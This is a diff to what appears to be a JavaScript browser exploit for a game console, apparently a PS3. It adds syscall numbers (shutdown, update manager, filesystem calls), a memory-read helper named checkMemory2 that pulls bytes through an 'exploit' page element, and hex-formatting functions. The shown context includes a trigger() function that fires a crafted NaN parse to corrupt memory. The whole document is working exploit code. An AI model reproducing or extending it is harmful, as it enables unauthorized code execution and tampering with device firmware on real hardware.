@@ -482,14 +482,21 @@ var f_off=0x0;
 
 var ppu_kalloc_id=0x111;
 var ppu_kalloc_sz=0x64;
+
 var soft_reboot=0x200;
 var hard_reboot=0x1200;
 var power_down=0x1100;
+var sc_sm_shutdown=0x17B;
+
 var sc_buzzer=0x188;
 var buzzer_arg1=0x1004;
 var buzzer_arg2=0xA;
 var buzzer_arg3=0x1B6;
-var sc_sm_shutdown=0x17B;
+
+var sc_update_manager_if=0x0000035F;
+var minver=0;
+var minver_addr=gtemp_addr-0x10000;
+
 var sc_sso=0x258;
 var sc_ssr=0x25A;
 var sc_ssc=0x259;
@@ -506,6 +513,7 @@ var sc_fs_close=0x324;
 var sc_fs_stat=0x328;
 var sc_fs_umount=0x345;
 var sc_fs_unmount=0x346;
+
 var fs_flag_readonly=0x0;
 var fs_flag_create=0x241;
 var fs_flag_create_append=0x441;
@@ -915,7 +923,46 @@ function checkMemory(address, size, len)
 	}
 	else {throw "exploit div: HTML error!";}
 }
+function checkMemory2(address, size, len, sub)
+{
+	if(size<len){throw "checkMemory function arguments error! size=0x"+size.toString(16)+" < len=0x"+size.toString(16);}
+	if(document.getElementById('exploit'))
+	{
+		readMemory(address, size);
+		if(debug===true)
+		{
+			var x=document.getElementById('exploit').style.src.substr(sub,len);
+			logAdd("checkMemory: "+x.toAscii(true));
+			return x;
+		}
+		return document.getElementById('exploit').style.src.substr(sub,len);
+	}
+	else {throw "exploit div: HTML error!";}
+}
+function s2hex(str)
+{
+	var hex = [];
+	var  i = 0;
+    for (;i < str.length; i++) {
+		hex.push(hex16(str.charCodeAt(i).toString(16)));
+    }
+	return hex.join("");
+}
 
+function hex32(s)
+{
+	return ('00000000' + s).substr(-8);
+}
+
+function hex16(s)
+{
+	return ('0000' + s).slice(-4)
+}
+
+function hex8(s)
+{
+	return ('00' + s).substr(-2);
+}
 function trigger(exploit_addr){
 	if(document.getElementById('trigger')){document.getElementById("trigger").innerHTML = -parseFloat("NAN(ffffe" + exploit_addr.toString(16) + ")");}
 	else {throw "trigger div: HTML error!";}
